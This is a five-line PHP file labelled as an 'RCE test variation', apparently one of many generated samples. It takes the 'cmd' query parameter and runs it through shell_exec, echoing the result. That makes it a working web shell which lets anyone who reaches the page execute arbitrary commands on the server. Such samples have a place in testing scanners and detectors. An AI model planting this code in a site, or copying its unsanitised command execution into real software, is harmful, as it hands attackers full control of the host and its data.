<?php
// RCE test variation #701
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>